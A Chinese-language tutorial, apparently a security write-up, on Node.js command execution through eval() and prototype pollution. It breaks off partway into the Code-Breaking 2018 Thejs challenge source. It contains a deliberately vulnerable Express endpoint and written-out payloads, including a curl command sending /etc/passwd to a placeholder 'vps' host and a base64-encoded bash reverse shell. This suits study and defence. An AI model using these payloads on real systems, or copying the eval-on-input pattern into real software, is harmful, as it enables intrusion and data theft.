## 危险函数所导致的命令执行
### eval()
eval() 函数可计算某个字符串，并执行其中的的 JavaScript
代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。
简单例子：
main.js
    var express = require("express");
    var app = express();
    app.get('/eval',function(req,res){
        res.send(eval(req.query.q));
        console.log(req.query.q);
    })
    var server = app.listen(8888, function() {
        console.log("应用实例，访问地址为 http://127.0.0.1:8888/");
    })
**漏洞利用：**
Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造`require('child_process').exec('');`来进行调用。
弹计算器(windows)：
    /eval?q=require('child_process').exec('calc');
读取文件(linux)：
    /eval?q=require('child_process').exec('curl -F "x=`cat /etc/passwd`" http://vps');;
反弹shell(linux)：
    /eval?q=require('child_process').exec('echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash');
    YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i >& /dev/tcp/127.0.0.1/3333 0>&1 BASE64加密后的结果，直接调用会报错。
    注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)
如果上下文中没有require(类似于Code-Breaking 2018
Thejs)，则可以使用`global.process.mainModule.constructor._load('child_process').exec('calc')`来执行命令
paypal一个命令执行的例子：
[[demo.paypal.com] Node.js code injection
(RCE)](https://artsploit.blogspot.com/2016/08/pprce2.html)
(使用数组绕过过滤，再调用child_process执行命令)
### 类似命令
间隔两秒执行函数：
  * setInteval(some_function, 2000)
两秒后执行函数：
  * setTimeout(some_function, 2000);
some_function处就类似于eval函数的参数
输出HelloWorld：
  * Function("console.log('HelloWolrd')")()
类似于php中的create_function
以上都可以导致命令执行
## Node.js 原型污染漏洞
Javascript原型链参考文章：[继承与原型链](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain)
### 关于原型链
文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：
  * 在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。
例子：
    object.prototype.name=value
  * 在javascript，每一个实例对象都有一个`__proto__`属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：
    objectname["__proto__"]
    objectname.__proto__
    objectname.constructor.prototype
  * 不同对象所生成的原型链如下(部分)：
    var o = {a: 1};
    // o对象直接继承了Object.prototype
    // 原型链：
    // o ---> Object.prototype ---> null
    var a = ["yo", "whadup", "?"];
    // 数组都继承于 Array.prototype
    // 原型链：
    // a ---> Array.prototype ---> Object.prototype ---> null
    function f(){
      return 2;
    }
    // 函数都继承于 Function.prototype
    // 原型链：
    // f ---> Function.prototype ---> Object.prototype ---> null
### 原型链污染原理
对于语句：`object[a][b] = value`
如果可以控制a、b、value的值，将a设置为`__proto__`，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。
来看一个简单的例子：
    object1 = {"a":1, "b":2};
    object1.__proto__.foo = "Hello World";
    console.log(object1.foo);
    object2 = {"c":1, "d":2};
    console.log(object2.foo);
最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello
World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。
### merge操作导致原型链污染
merge操作是最常见可能控制键名的操作，也最能被原型链攻击。
  * 简单例子：
    function merge(target, source) {
        for (let key in source) {
            if (key in source && key in target) {
                merge(target[key], source[key])
            } else {
                target[key] = source[key]
            }
        }
    }
    let object1 = {}
    let object2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
    merge(object1, object2)
    console.log(object1.a, object1.b)
    object3 = {}
    console.log(object3.b)
需要注意的点是：
在JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。
最终输出的结果为：
    1 2
    2
可见object3的b是从原型中获取到的，说明Object已经被污染了。
### Code-Breaking 2018 Thejs
这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。
题目源码下载：
直接npm install可以把需要的模块下载下来。
server.js
    const fs = require('fs')
    const express = require('express')
    const bodyParser = require('body-parser')
    const lodash = require('lodash')
    const session = require('express-session')
    const randomize = require('randomatic')
    const app = express()
    app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())
    app.use('/static', express.static('static'))
    app.use(session({
        name: 'thejs.session',
        secret: randomize('aA0', 16),
        resave: false,
        saveUninitialized: false
    }))
    app.engine('ejs', function (filePath, options, callback) { // define the template engine
        fs.readFile(filePath, (err, content) => {
            if (err) return callback(new Error(err))
            let compiled = lodash.template(content)
            let rendered = compiled({...options})
            return callback(null, rendered)
        })
    })
    app.set('views', './views')
    app.set('view engine', 'ejs')